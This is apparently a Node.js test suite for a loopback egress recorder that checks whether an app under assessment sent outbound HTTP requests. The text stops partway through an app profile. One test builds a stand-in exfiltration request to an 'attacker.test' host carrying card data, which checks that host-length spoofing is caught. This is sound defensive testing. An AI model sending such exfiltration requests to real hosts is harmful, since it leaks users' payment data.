// Egress recorder (integrations/observers/egress-recorder.mjs): a loopback sink
// for the app's outbound HTTP. Every request here goes to 127.0.0.1; the
// destination hosts are names only and are never resolved or contacted.
import test from 'node:test';
import assert from 'node:assert/strict';
import { request, createServer } from 'node:http';
import { connect } from 'node:net';
import { createEgressRecorder } from './egress-recorder.mjs';
import { onFreePorts, watchingBinds } from './fixtures/free-port.mjs';
import { buildObservers } from './factory.mjs';
import { collectWindow, evaluateEffectAssertion } from './events.mjs';
import { validateEgressConfig } from '../../src/egress-rules.mjs';
import { runHttpAssessment, credentialReadiness } from '../../src/http-connector.mjs';
import { validateHttpRunEvidence, validateTargetFile } from '../../src/contracts.mjs';
import { createRegistry } from '../../src/registry.mjs';
import { digest } from '../../src/domain.mjs';
import { decideEffects, effectTrace, recomputeEffectTrace } from '../../src/http-effects.mjs';

const PAY = 'api.pay.example', HOOK = 'hooks.chat.example', WITNESS = 'witness.scopehaven.invalid';
// The port is a placeholder for configuration-only tests; a sink that listens gets a free one (fixtures/free-port.mjs).
const config = extra => ({ port: 47000, routing: 'proxy', destinations: [{ host: PAY, paths: ['/v1/charges', '/v1/refunds'] }, { host: HOOK }],
  witness: { actorId: 'ops', method: 'GET', path: '/ping', host: WITNESS }, witnessWaitMs: 1500, quietMs: 150, ...extra });
function recorder(t, extra = {}, { instanceId = 'egress-recorder-sink', retainedRequests } = {}) {
  return onFreePorts(1, async port => {
    const o = createEgressRecorder({ instanceId, ...(retainedRequests ? { retainedRequests } : {}), ...config({ port, ...extra }) });
    await o.start(); t.after(() => o.stop());
    return o;
  });
}
// One request to the sink: in proxy form (absolute URL) unless `path` is origin-form.
function send(o, { method = 'POST', target, body = '', headers = {}, abort = false }) {
  return new Promise(resolve => {
    const url = /^https?:/.test(target) ? new URL(target) : null;
    const req = request({ host: '127.0.0.1', port: o.port, method, path: target, headers: { host: url ? url.host : `127.0.0.1:${o.port}`, ...headers } }, res => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
    req.on('error', () => resolve(null));
    if (abort) { req.write(body.slice(0, 5)); setTimeout(() => { req.destroy(); resolve(null); }, 50); return; }
    req.end(body);
  });
}
const witness = (o, from, nonce = from.witnessNonce) => send(o, { method: 'GET', target: `http://${WITNESS}/w?scopehaven_witness=${encodeURIComponent(nonce)}` });
// A window: start mark, the app's sends, then the witness request (marked first) and the end mark.
async function window(o, between, { withWitness = true, nonce } = {}) {
  const from = await o.mark();
  await between();
  o.markWitnessRequest(from);
  if (withWitness) await witness(o, from, nonce);
  const to = await o.mark();
  return collectWindow(o, from, to);
}
const none = select => ({ kind: 'effect.none', select: { source: 'http-egress', operation: 'send', ...select } });
const exists = select => ({ kind: 'effect.exists', select: { source: 'http-egress', operation: 'send', ...select } });

test('egress: a forbidden send is caught by host and declared path; a clean window with its witness proves absence', async t => {
  const o = await recorder(t);
  const sent = await window(o, async () => assert.equal(await send(o, { target: `http://${PAY}/v1/charges?amount=100`, body: '{"amount":100}' }), 202));
  assert.deepEqual([sent.coverage, sent.reason], ['complete', null]);
  assert.deepEqual(sent.events.map(e => [e.operation, e.name, e.resource, e.outcome]), [['send', PAY, 'POST /v1/charges', 'committed']]);
  assert.equal(evaluateEffectAssertion(none({ name: PAY }), [sent]).verdict, 'fail');
  assert.equal(evaluateEffectAssertion(none({ name: PAY, resource: 'POST /v1/charges' }), [sent]).verdict, 'fail');
  assert.equal(evaluateEffectAssertion(none({ name: HOOK }), [sent]).verdict, 'pass');
  const clean = await window(o, async () => {});
  assert.deepEqual([clean.coverage, clean.events.length], ['complete', 0]);
  assert.equal(evaluateEffectAssertion(none({ name: PAY }), [clean]).verdict, 'pass');
  assert.equal(evaluateEffectAssertion(exists({ name: PAY }), [clean]).verdict, 'fail');
});

test('egress: without this window\'s witness, absence is never claimed (missing, foreign or duplicate witness)', async t => {
  const o = await recorder(t);
  const silent = await window(o, async () => {}, { withWitness: false });
  assert.deepEqual([silent.coverage, silent.reason], ['partial', 'egress-witness-not-received']);
  assert.equal(evaluateEffectAssertion(none({ name: PAY }), [silent]).verdict, 'missing');
  const foreign = await window(o, async () => {}, { nonce: 'another-window' });
  assert.match(foreign.reason, /egress-foreign-witness/); assert.notEqual(evaluateEffectAssertion(none({ name: PAY }), [foreign]).verdict, 'pass');
  const from = await o.mark(); o.markWitnessRequest(from); await witness(o, from); await witness(o, from);
  const twice = await collectWindow(o, from, await o.mark());
  assert.match(twice.reason, /egress-duplicate-witness/);
});

test('egress: a send after the witness request was sent is never an effect, and the window is partial', async t => {
  const o = await recorder(t);
  const from = await o.mark();
  o.markWitnessRequest(from);
  await send(o, { target: `http://${PAY}/v1/charges` });
  await witness(o, from);
  const w = await collectWindow(o, from, await o.mark());
  assert.equal(w.events.length, 0); assert.match(w.reason, /egress-request-after-witness-request/);
  assert.notEqual(evaluateEffectAssertion(none({ name: PAY }), [w]).verdict, 'pass');
});

const tunnel = o => window(o, () => new Promise(resolve => {
  const s = connect(o.port, '127.0.0.1', () => s.write(`CONNECT ${PAY}:443 HTTP/1.1\r\nHost: ${PAY}:443\r\n\r\n`));
  let reply = ''; s.on('data', d => { reply += d; }); s.on('close', () => { assert.match(reply, /^HTTP\/1\.1 403/); resolve(); }); s.on('error', () => resolve());
}));
test('egress: an HTTPS tunnel request is recorded by host and refused; its payload is unseen, so the window is partial', async t => {
  const o = await recorder(t);
  const w = await tunnel(o);
  assert.deepEqual(w.events.map(e => [e.name, e.resource]), [[PAY, 'CONNECT :443']]);
  assert.match(w.reason, /egress-tunnel-payload-unseen/);
  assert.equal(evaluateEffectAssertion(none({ name: PAY }), [w]).verdict, 'fail', 'a tunnel to the host is a send to it');
  assert.notEqual(evaluateEffectAssertion(none({ name: PAY, resource: 'POST /v1/charges' }), [w]).verdict, 'pass', 'the tunnel could carry any path');
});

test('egress: malformed, browser-origin and over-limit requests leave the window partial', async t => {
  const o = await recorder(t, { maxBodyBytes: 1024 });
  const malformed = await window(o, () => new Promise(resolve => { const s = connect(o.port, '127.0.0.1', () => s.end('NOT HTTP AT ALL\r\n\r\n')); s.on('close', resolve); s.on('error', resolve); s.resume(); }));
  assert.match(malformed.reason, /egress-malformed-request/); assert.notEqual(evaluateEffectAssertion(none({ name: PAY }), [malformed]).verdict, 'pass');
  const browser = await window(o, () => send(o, { target: `http://${PAY}/v1/charges`, headers: { origin: 'http://evil.example' } }));
  assert.match(browser.reason, /egress-browser-request/); assert.equal(browser.events.length, 0);
  const big = await window(o, () => send(o, { target: `http://${HOOK}/x`, body: 'x'.repeat(5000) }));
  assert.match(big.reason, /egress-body-over-limit/);
  assert.deepEqual(big.events.map(e => [e.name, e.outcome]), [[HOOK, 'unknown']]);
});

test('egress: an aborted send is incomplete, never committed, and the window is partial', async t => {
  const o = await recorder(t);
  const w = await window(o, () => send(o, { target: `http://${HOOK}/x`, body: 'a long body that is cut off', headers: { 'content-length': '200' }, abort: true }));
  assert.match(w.reason, /egress-request-(incomplete|in-flight)/);
  assert.ok(w.events.every(e => e.outcome !== 'committed'));
  assert.notEqual(evaluateEffectAssertion(none({ name: HOOK }), [w]).verdict, 'pass');
});

test('egress: a percent-encoded path cannot dodge a declared path selector', async t => {
  const o = await recorder(t);
  const w = await window(o, () => send(o, { target: `http://${PAY}/v1/%63harges` }));
  assert.deepEqual(w.events.map(e => e.resource), ['POST /v1/charges']);
  assert.match(w.reason, /egress-path-ambiguous/);
  assert.equal(evaluateEffectAssertion(none({ name: PAY, resource: 'POST /v1/charges' }), [w]).verdict, 'fail');
  // An undeclared path is named "*", never by its raw text.
  const other = await window(o, () => send(o, { target: `http://${HOOK}/services/T000/B000/s3cr3tw3bh00k` }));
  assert.deepEqual(other.events.map(e => e.resource), ['POST *']);
  assert.doesNotMatch(JSON.stringify(other), /s3cr3tw3bh00k/, 'raw paths are digested, never stored');
});

test('egress: base-url routing maps declared prefixes to hosts; an unrouted request is a gap', async t => {
  const o = await recorder(t, { routing: 'base-url', routes: [{ prefix: '/pay/', host: PAY }, { prefix: '/w/', host: WITNESS }] });
  const from = await o.mark();
  await send(o, { target: '/pay/v1/refunds' });
  await send(o, { target: '/elsewhere/x' });
  o.markWitnessRequest(from);
  await send(o, { method: 'GET', target: `/w/ping?scopehaven_witness=${from.witnessNonce}` });
  const w = await collectWindow(o, from, await o.mark());
  assert.deepEqual(w.events.map(e => [e.name, e.resource]), [[PAY, 'POST /v1/refunds']]);
  assert.match(w.reason, /egress-unrouted-request/);
  assert.notEqual(evaluateEffectAssertion(none({ name: HOOK }), [w]).verdict, 'pass');
});

test('egress: without declared routing the recorder is presence-only: a send fails a check, silence proves nothing', async t => {
  const o = await recorder(t, { routing: undefined, witness: undefined });
  assert.equal(o.scope.evidence, 'presence-only'); assert.equal(o.witnessRequest, undefined);
  const from = await o.mark(); await send(o, { target: `http://${PAY}/v1/charges` });
  const w = await collectWindow(o, from, await o.mark());
  assert.equal(evaluateEffectAssertion(none({ name: PAY }), [w]).verdict, 'fail');
  const from2 = await o.mark(), quiet = await collectWindow(o, from2, await o.mark());
  assert.equal(evaluateEffectAssertion(none({ name: PAY }), [quiet]).verdict, 'unobservable');
});

test('egress: a listener that went down since the start mark fails the window; a late collect that missed arrivals is partial', async t => {
  const o = await recorder(t);
  const from = await o.mark(); await o.stop();
  const down = await collectWindow(o, from, await o.mark());
  assert.equal(down.coverage, 'failed');
  const p = await recorder(t);
  const a = await p.mark(); p.markWitnessRequest(a); await witness(p, a); const b = await p.mark();
  await new Promise(r => setTimeout(r, 400));
  await send(p, { target: `http://${HOOK}/late` });
  const late = await collectWindow(p, a, b);
  assert.match(late.reason, /egress-collect-late/);
});

test('egress: a send still in flight when collect returns is a gap, and an evicted window fails', async t => {
  const o = await recorder(t);
  const from = await o.mark();
  const req = request({ host: '127.0.0.1', port: o.port, method: 'POST', path: `http://${HOOK}/slow`, headers: { host: HOOK, 'content-length': '100' } });
  req.on('error', () => {}); req.write('partial');
  await new Promise(r => setTimeout(r, 50));
  o.markWitnessRequest(from); await witness(o, from);
  const w = await collectWindow(o, from, await o.mark());
  req.destroy();
  assert.match(w.reason, /egress-request-in-flight/); assert.notEqual(evaluateEffectAssertion(none({ name: HOOK }), [w]).verdict, 'pass');
  const small = await recorder(t, {}, { instanceId: 'egress-recorder-small', retainedRequests: 3 });
  const a = await small.mark();
  for (let i = 0; i < 5; i++) await send(small, { target: `http://${HOOK}/n${i}` });
  small.markWitnessRequest(a); await witness(small, a);
  const evicted = await collectWindow(small, a, await small.mark());
  assert.deepEqual([evicted.coverage, evicted.reason], ['failed', 'egress-records-evicted']);
});

test('egress: a send arriving just after the witness is still read (quiet period), and host names are normalized', async t => {
  const o = await recorder(t, { quietMs: 400 });
  const from = await o.mark();
  o.markWitnessRequest(from); await witness(o, from);
  setTimeout(() => send(o, { target: `http://${PAY}./v1/charges` }), 100);
  const w = await collectWindow(o, from, await o.mark());
  assert.match(w.reason ?? '', /egress-request-after-witness-request/, 'a late send is read and never ignored');
  assert.notEqual(evaluateEffectAssertion(none({ name: PAY }), [w]).verdict, 'pass');
  const dotted = await window(o, () => send(o, { target: `http://API.Pay.Example./v1/refunds` }));
  assert.deepEqual(dotted.events.map(e => [e.name, e.resource]), [[PAY, 'POST /v1/refunds']]);
});

test('egress: a listener that stops after the end mark, before collect, fails the window', async t => {
  const o = await recorder(t);
  const from = await o.mark(); o.markWitnessRequest(from); await witness(o, from); const to = await o.mark();
  assert.equal(to.ok, true);
  await o.stop();
  const w = await collectWindow(o, from, to);
  assert.deepEqual([w.coverage, w.reason], ['failed', 'egress-listener-down']);
});

test('egress: a sealed window is bound to its observer type (a relabelled source is refused on recompute)', async t => {
  const o = await recorder(t);
  const w = await window(o, () => send(o, { target: `http://${PAY}/v1/charges` }));
  // A selector without a source: relabelling the window leaves the verdict unchanged, so only the binding can refuse it.
  const effects = [{ kind: 'effect.none', select: { name: PAY, operation: 'send' } }];
  const meta = new Map([[w.instanceId, { kind: 'http-egress-recorder', settleMs: 250 }]]), declared = [{ id: 'sink', type: 'egress-recorder', settleMs: 250 }];
  recomputeEffectTrace(effectTrace(decideEffects(effects, [w]), [w], meta), effects, declared);
  const forged = { ...structuredClone(w), source: 'hold-proxy' }; for (const e of forged.events) e.source = 'hold-proxy';
  assert.equal(decideEffects(effects, [forged])[0].verdict, decideEffects(effects, [w])[0].verdict);
  assert.throws(() => recomputeEffectTrace(effectTrace(decideEffects(effects, [forged]), [forged], meta), effects, declared), /effect-trace/);
});

// Like send(), but returns the status, the content type and the body text.
function sendRead(o, { method = 'POST', target, body = '' }) {
  return new Promise(resolve => {
    const url = new URL(target);
    const req = request({ host: '127.0.0.1', port: o.port, method, path: target, headers: { host: url.host } }, res => { let text = ''; res.setEncoding('utf8'); res.on('data', d => { text += d; }); res.on('end', () => resolve({ status: res.statusCode, type: res.headers['content-type'] ?? null, text })); });
    req.on('error', () => resolve(null)); req.end(body);
  });
}
test('egress test-mode replies: a declared JSON answer per destination, method and path; nothing is echoed; recording is unchanged', async t => {
  const charge = { id: 'ch_test_scopehaven', object: 'charge', livemode: false, status: 'succeeded' };
  const o = await recorder(t, { replies: [{ host: PAY, method: 'POST', path: '/v1/charges', status: 200, json: charge }, { host: HOOK, status: 204, json: {} }] });
  let got;
  const w = await window(o, async () => { got = await sendRead(o, { target: `http://${PAY}/v1/charges`, body: 'amount=4200&card=tok_visa&secret=req-secret-123' }); });
  assert.deepEqual([got.status, got.type, JSON.parse(got.text)], [200, 'application/json', charge]);
  assert.doesNotMatch(got.text, /req-secret-123|4200/, 'a reply never echoes the request');
  assert.deepEqual(w.events.map(e => [e.name, e.resource, e.outcome]), [[PAY, 'POST /v1/charges', 'committed']], 'what is recorded does not depend on the reply');
  // Another method or path on the same host, and an undeclared destination, get the plain reply.
  for (const [method, target, status] of [['GET', `http://${PAY}/v1/charges`, 202], ['POST', `http://${PAY}/v1/refunds`, 202], ['POST', 'http://other.example/x', 202], ['POST', `http://${HOOK}/any`, 204]]) {
    const r = await sendRead(o, { method, target }); assert.equal(r.status, status, `${method} ${target}`);
    if (status === 202) assert.equal(r.text, '');
  }
});

// Raw bytes on one connection, a chunk at a time; resolves after waitMs with what the sink answered and the socket.
function raw(o, chunks, { waitMs = 300, keep = false } = {}) {
  return new Promise(resolve => {
    const socket = connect({ host: '127.0.0.1', port: o.port }); let out = '';
    socket.on('data', d => { out += d; }); socket.on('error', () => {});
    socket.on('connect', async () => {
      for (const c of chunks) { socket.write(c); await new Promise(r => setTimeout(r, 40)); }
      setTimeout(() => { if (!keep) socket.destroy(); resolve({ out, socket }); }, waitMs);
    });
  });
}
const post = (url, host) => `POST ${url} HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 2\r\n\r\n{}`;

test('a send addressed under another name (Host mismatch) or by an undeclared IP literal leaves the window partial', async t => {
  const o = await recorder(t);
  // The URL names an IP literal, the Host header the declared destination.
  const literal = await window(o, () => raw(o, [post('http://198.51.100.9/v1/charges', PAY)]));
  assert.equal(literal.coverage, 'partial');
  assert.match(literal.reason, /egress-address-literal/); assert.match(literal.reason, /egress-host-mismatch/);
  assert.notEqual(evaluateEffectAssertion(none({ name: PAY }), [literal]).verdict, 'pass');
  // An IPv6 literal in both.
  const v6 = await window(o, () => raw(o, [post('http://[2001:db8::1]:8443/v1/charges', '[2001:db8::1]:8443')]));
  assert.match(v6.reason, /egress-address-literal/); assert.doesNotMatch(v6.reason, /egress-host-mismatch/);
  assert.notEqual(evaluateEffectAssertion(none({ name: PAY }), [v6]).verdict, 'pass');
  // A declared URL host with a Host header naming another host.
  const mismatch = await window(o, () => raw(o, [post(`http://${PAY}/v1/charges`, 'other.example')]));
  assert.equal(mismatch.reason, 'egress-host-mismatch');
  // The same host apart from case, port and a trailing dot is not a mismatch.
  const same = await window(o, () => raw(o, [post(`http://${PAY}/v1/charges`, 'API.PAY.EXAMPLE.:80')]));
  assert.deepEqual([same.coverage, same.events.map(e => e.name)], ['complete', [PAY]]);
});

test('a reused connection\'s next request is recorded; headers still arriving when collect runs leave the window partial', async t => {
  const o = await recorder(t);
  // A second request on the same connection after the reply.
  const reused = await window(o, () => raw(o, [post(`http://${PAY}/v1/charges`, PAY), post(`http://${PAY}/v1/refunds`, PAY)]));
  assert.deepEqual([reused.coverage, reused.events.map(e => e.resource)], ['complete', ['POST /v1/charges', 'POST /v1/refunds']]);
  // A request whose headers have not ended.
  let held;
  const incomplete = await window(o, async () => { held = (await raw(o, [`POST http://${PAY}/v1/charges HTTP/1.1\r\nHost: ${PAY}\r\n`], { waitMs: 50, keep: true })).socket; });
  assert.deepEqual([incomplete.coverage, incomplete.reason], ['partial', 'egress-request-in-flight']);
  assert.notEqual(evaluateEffectAssertion(none({ name: PAY }), [incomplete]).verdict, 'pass');
  held.destroy();
});

test('final mode: the run-end window (gap, final) keeps the arriving-request check; an ordinary gap window does not, as before', async t => {
  const o = await recorder(t);
  const asGap = options => ({ source: o.source, instanceId: o.instanceId, scope: o.scope, collect: (from, to) => o.collect(from, to, options) });
  const from = await o.mark();
  await raw(o, [post(`http://${HOOK}/x`, HOOK)], { waitMs: 80 });
  const { socket } = await raw(o, [`POST http://${PAY}/v1/charges HTTP/1.1\r\nHost: ${PAY}\r\n`], { waitMs: 80, keep: true });
  const to = await o.mark();
  const gap = await collectWindow(asGap({ gap: true }), from, to);
  assert.deepEqual([gap.coverage, gap.reason, gap.events.map(e => e.name)], ['complete', null, [HOOK]]);
  const final = await collectWindow(asGap({ gap: true, final: true }), from, to);
  assert.deepEqual([final.coverage, final.reason, final.events.map(e => e.name)], ['partial', 'egress-request-in-flight', [HOOK]]);
  assert.notEqual(evaluateEffectAssertion(none({ name: PAY }), [final]).verdict, 'pass');
  socket.destroy();
  // The request was arriving at the window's end mark: done by collection time, the run-end window is still partial.
  await new Promise(resolve => setTimeout(resolve, 200));
  const after = await collectWindow(asGap({ gap: true, final: true }), from, to);
  assert.deepEqual([after.coverage, after.reason], ['partial', 'egress-request-in-flight']);
  // A run-end window whose end mark saw nothing arriving reads complete (once the cut connection's record has landed).
  let clean;
  for (let i = 0; i < 100; i++) {
    const a = await o.mark(), b = await o.mark();
    clean = await collectWindow(asGap({ gap: true, final: true }), a, b);
    if (clean.coverage === 'complete') break;
    await new Promise(resolve => setTimeout(resolve, 50));
  }
  assert.deepEqual([clean.coverage, clean.reason], ['complete', null]);
});

test('a request still arriving behind a completed one in the same write leaves the window partial, open or cut off; an idle connection does not', async t => {
  const o = await recorder(t);
  const charging = `POST http://${PAY}/v1/charges HTTP/1.1\r\nHost: ${PAY}\r\n`; // headers not ended
  // A complete hook call and the first bytes of a charge, in one write, the connection held open.
  let held;
  const open = await window(o, async () => { held = (await raw(o, [post(`http://${HOOK}/x`, HOOK) + charging], { waitMs: 80, keep: true })).socket; });
  assert.deepEqual([open.coverage, open.reason, open.events.map(e => e.name)], ['partial', 'egress-request-in-flight', [HOOK]]);
  assert.notEqual(evaluateEffectAssertion(none({ name: PAY }), [open]).verdict, 'pass');
  held.destroy();
  // The same write, the connection cut off before collect: the cut message is malformed.
  const cut = await window(o, () => raw(o, [post(`http://${HOOK}/x`, HOOK) + charging], { waitMs: 80 }));
  assert.equal(cut.coverage, 'partial'); assert.match(cut.reason, /egress-malformed-request/);
  assert.notEqual(evaluateEffectAssertion(none({ name: PAY }), [cut]).verdict, 'pass');
  // A connection kept open after its request was answered is idle, not in flight.
  let idle;
  const kept = await window(o, async () => { idle = (await raw(o, [post(`http://${PAY}/v1/charges`, PAY)], { waitMs: 80, keep: true })).socket; });
  assert.deepEqual([kept.coverage, kept.reason, kept.events.map(e => e.resource)], ['complete', null, ['POST /v1/charges']]);
  idle.destroy();
});

test('runtime pin: this Node keeps the HTTP server\'s connections list the recorder reads, and it reports a request still arriving', async t => {
  // The recorder reads Node's internal per-server connections list (kept for request timeouts). A runtime that drops
  // or changes it would make every egress window partial; this test names that change instead.
  const server = createServer((req, res) => { req.resume(); req.on('end', () => res.end()); });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  t.after(() => new Promise(resolve => { server.close(resolve); server.closeAllConnections(); }));
  const connections = server[Object.getOwnPropertySymbols(server).find(k => k.description === 'http.server.connections')];
  assert.equal(typeof connections?.active, 'function', `Node ${process.version} has no http.server.connections list with active()`);
  const socket = connect(server.address().port, '127.0.0.1'); t.after(() => socket.destroy());
  await new Promise(resolve => socket.on('connect', resolve));
  // Polled up to 5 s: under load the server may parse a chunk late.
  const settled = async want => { for (let i = 0; i < 100 && connections.active().length !== want; i++) await new Promise(resolve => setTimeout(resolve, 50)); return connections.active().length; };
  socket.write('POST /x HTTP/1.1\r\nHost: a\r\n'); // headers not ended
  assert.equal(await settled(1), 1, 'a request whose headers are still arriving is active');
  socket.write('Content-Length: 0\r\n\r\n');
  assert.equal(await settled(0), 0, 'a completed request is not');
});

test('without the server parser\'s state (another runtime) every window is partial', async t => {
  const real = Object.getOwnPropertySymbols;
  Object.getOwnPropertySymbols = target => real(target).filter(k => k.description !== 'http.server.connections');
  let o;
  try { o = await recorder(t); } finally { Object.getOwnPropertySymbols = real; }
  const quiet = await window(o, async () => {});
  assert.deepEqual([quiet.coverage, quiet.reason], ['partial', 'egress-parser-state-unavailable']);
  assert.equal(evaluateEffectAssertion(none({ name: PAY }), [quiet]).verdict, 'missing');
});

test('a witness nonce on a destination request is still a send; the query is in the digest; digests are salted per recorder', async t => {
  const o = await recorder(t);
  const from = await o.mark();
  await send(o, { method: 'GET', target: `http://${PAY}/v1/charges?scopehaven_witness=${encodeURIComponent(from.witnessNonce)}` });
  o.markWitnessRequest(from); await witness(o, from);
  const carried = await collectWindow(o, from, await o.mark());
  assert.deepEqual([carried.coverage, carried.events.map(e => `${e.name} ${e.resource}`)], ['complete', [`${PAY} GET /v1/charges`]]);
  assert.equal(evaluateEffectAssertion(none({ name: PAY }), [carried]).verdict, 'fail');
  const queries = await window(o, async () => { await send(o, { method: 'GET', target: `http://${PAY}/v1/charges?a=1` }); await send(o, { method: 'GET', target: `http://${PAY}/v1/charges?a=2` }); });
  assert.notEqual(queries.events[0].contentDigest, queries.events[1].contentDigest);
  const other = await recorder(t);
  const again = await window(other, () => send(other, { method: 'GET', target: `http://${PAY}/v1/charges?a=1` }));
  assert.notEqual(again.events[0].contentDigest, queries.events[0].contentDigest, 'the same request in another recorder');
  // A tunnel has no body digest, so only the salted target keeps its digest from naming the destination.
  const [first, second] = [(await tunnel(o)).events[0], (await tunnel(other)).events[0]];
  assert.deepEqual([first.resource, second.resource], ['CONNECT :443', 'CONNECT :443']);
  assert.notEqual(first.contentDigest, second.contentDigest, 'the same tunnel in another recorder');
});

test('egress: a host over 128 characters is never an event, never shortened into a declared host: the window is partial', async t => {
  const LONG = `${'a'.repeat(63)}.${'b'.repeat(56)}.example`;
  assert.equal(LONG.length, 128);
  const o = await recorder(t, { destinations: [{ host: PAY, paths: ['/v1/charges'] }, { host: LONG }] });
  const only = allow => ({ kind: 'effect.only', allow, sources: ['http-egress'] });
  // An undeclared host whose first 128 characters are the declared one: cut to 128 it read as a send to the declared host.
  const evil = await window(o, () => send(o, { target: `http://${LONG}x.attacker.test/exfil`, body: '{"card":"x"}' }));
  assert.deepEqual([evil.coverage, evil.reason, evil.events], ['partial', 'egress-host-over-limit', []]);
  assert.notEqual(evaluateEffectAssertion(exists({ name: LONG }), [evil]).verdict, 'pass');
  assert.notEqual(decideEffects([only([{ source: 'http-egress', operation: 'send', name: LONG }])], [evil])[0].verdict, 'pass');
  // Adjacent: the declared 128-character host itself is an event named by it, and the window is complete.
  const own = await window(o, () => send(o, { target: `http://${LONG}/hook`, body: '{}' }));
  assert.deepEqual([own.coverage, own.reason, own.events.map(e => [e.name, e.resource])], ['complete', null, [[LONG, 'POST *']]]);
  assert.equal(evaluateEffectAssertion(exists({ name: LONG }), [own]).verdict, 'pass');
  assert.equal(decideEffects([only([{ source: 'http-egress', operation: 'send', name: LONG }])], [own])[0].verdict, 'pass');
});

test('egress configuration: test-mode replies are declared, bounded JSON for declared destinations', () => {
  const actors = { ops: {} }, base = { id: 'sink', type: 'egress-recorder', ...config(), replies: [{ host: PAY, status: 200, json: { ok: true } }] };
  validateEgressConfig(base, actors);
  const reject = (edit, pattern) => { const o = structuredClone(base); edit(o); assert.throws(() => validateEgressConfig(o, actors), pattern); };
  reject(o => { o.replies[0].host = 'other.example'; }, /declared destination host/);
  reject(o => { o.replies[0].status = 99; }, /"status" is an HTTP status/);
  reject(o => { o.replies[0].json = 'text'; }, /JSON object or array/);
  reject(o => { o.replies[0].json = { blob: 'x'.repeat(20000) }; }, /16384 bytes/);
  reject(o => { o.replies[0].method = 'TRACE'; }, /"method" is one of/);
  reject(o => { o.replies[0].path = 'v1/charges'; }, /literal path prefix/);
  reject(o => { o.replies[0].echo = true; }, /nothing else/);
  reject(o => { o.replies = []; }, /1 to 32/);
});

test('egress configuration: routing needs a witness, destinations are plain hosts, routes never overlap', () => {
  const actors = { ops: {} };
  const base = { id: 'sink', type: 'egress-recorder', ...config() };
  validateEgressConfig(base, actors);
  const reject = (edit, pattern) => { const o = structuredClone(base); edit(o); assert.throws(() => validateEgressConfig(o, actors), pattern); };
  reject(o => { delete o.witness; }, /"routing" and "witness" go together/);
  reject(o => { delete o.routing; }, /"routing" and "witness" go together/);
  reject(o => { o.routing = 'dns'; }, /"routing" must be one of/);
  reject(o => { o.witness.host = PAY; }, /not a destination/);
  reject(o => { o.witness.method = 'POST'; }, /witness must be a GET/);
  reject(o => { o.witness.actorId = 'nobody'; }, /declared actor/);
  reject(o => { o.witness.path = '/ping?scopehaven_witness=x'; }, /its own witness parameter/);
  reject(o => { o.destinations = [{ host: 'https://api.pay.example' }]; }, /lowercase host name/);
  reject(o => { o.destinations = [{ host: 'API.PAY.EXAMPLE' }]; }, /lowercase host name/);
  reject(o => { o.destinations = [{ host: PAY }, { host: PAY }]; }, /declared once/);
  reject(o => { o.routes = [{ prefix: '/pay/', host: PAY }]; }, /only with routing "base-url"/);
  reject(o => { o.routing = 'base-url'; o.routes = [{ prefix: '/pay/', host: PAY }]; }, /witness host needs a route/);
  reject(o => { o.routing = 'base-url'; o.routes = [{ prefix: '/pay/', host: PAY }, { prefix: '/pay/', host: WITNESS }]; }, /declared once/);
  reject(o => { o.routing = 'base-url'; o.routes = [{ prefix: '/x/', host: 'unknown.example' }, { prefix: '/w/', host: WITNESS }]; }, /declared destination or the witness host/);
  reject(o => { o.port = 80; }, /"port" must be an integer from 1024/);
  reject(o => { o.reply = { status: 302, body: 'x' }; }, /"reply" is \{ status \}/);
  reject(o => { o.forward = true; }, /an egress-recorder observer is/);
});

// End to end: an app whose /run route makes an outbound call through its proxy
// (the sink), and whose /ping route makes the witness call. Both go to 127.0.0.1.
async function app(t, sinkPort, { sends }) {
  const outbound = (target, body = '') => new Promise(resolve => {
    const url = new URL(target);
    const req = request({ host: '127.0.0.1', port: sinkPort, method: body ? 'POST' : 'GET', path: target, headers: { host: url.host } }, res => { res.resume(); res.on('end', resolve); });
    req.on('error', resolve); req.end(body);
  });
  const server = createServer(async (req, res) => {
    const reply = (status, body) => { res.writeHead(status, { 'Content-Type': 'application/json', Connection: 'close' }); res.end(JSON.stringify(body)); };
    req.resume();
    const user = { 'Bearer synthetic-ops-token': 'ops', 'Bearer synthetic-bob-token': 'bob' }[req.headers.authorization];
    if (!user) return reply(401, {});
    const url = new URL(req.url, 'http://127.0.0.1');
    if (url.pathname === '/me') return reply(200, { user });
    if (url.pathname === '/ping') { await outbound(`http://${WITNESS}/w?scopehaven_witness=${encodeURIComponent(url.searchParams.get('scopehaven_witness') ?? '')}`); return reply(200, { ok: true }); }
    if (url.pathname === '/agent/summarize') { if (sends) await outbound(`http://${PAY}/v1/charges`, '{"amount":4200}'); return reply(200, { summary: 'done' }); }
    // The allowed use: a checkout places one order with the payments API.
    if (url.pathname === '/agent/checkout') { await outbound(`http://${PAY}/v1/orders`, '{"cart":"c-1"}'); return reply(200, { ordered: true }); }
    reply(404, {});
  });
  await new Promise(r => server.listen(0, '127.0.0.1', r));
  t.after(() => new Promise(r => { server.close(r); server.closeAllConnections(); }));
  return `http://127.0.0.1:${server.address().port}`;
}
// CHECKOUT is the actor's required allowed-use control with a positive effect (its order through the sink), before NO-CHARGE, so
// NO-CHARGE's unpinned absence is guarded: an app that did nothing would fail CHECKOUT.
const profile = (origin, sinkPort) => ({ id: 'agent-app', name: 'Agent app', applicationId: 'agent-app', origin, buildLabel: 'b1', contextId: 'synthetic-agent',
  actors: { ops: { principalId: 'ops', credentialEnv: 'SCOPEHAVEN_TARGET_OPS', identityValue: 'ops' } }, requiredControlIds: ['WHOAMI', 'CHECKOUT'],
  observers: [{ id: 'sink', type: 'egress-recorder', port: sinkPort, routing: 'proxy', destinations: [{ host: PAY, paths: ['/v1/charges', '/v1/orders'] }], witness: { actorId: 'ops', method: 'GET', path: '/ping', host: WITNESS }, settleMs: 250, quietMs: 150 }],
  checks: [
    { id: 'WHOAMI', title: 'Who am I', category: 'identity', severity: 'control', actorId: 'ops', method: 'GET', path: '/me', evidenceRequirement: 'response', assertions: [{ kind: 'status.equals', expected: 200 }, { kind: 'json.equals', pointer: '/user', expected: 'ops' }] },
    { id: 'CHECKOUT', title: 'A checkout places one order', category: 'allowed-use', severity: 'control', actorId: 'ops', method: 'POST', path: '/agent/checkout', body: {}, evidenceRequirement: 'response',
      assertions: [{ kind: 'status.equals', expected: 200 }], effects: [{ kind: 'effect.exists', select: { source: 'http-egress', name: PAY, operation: 'send', resource: 'POST /v1/orders' } }] },
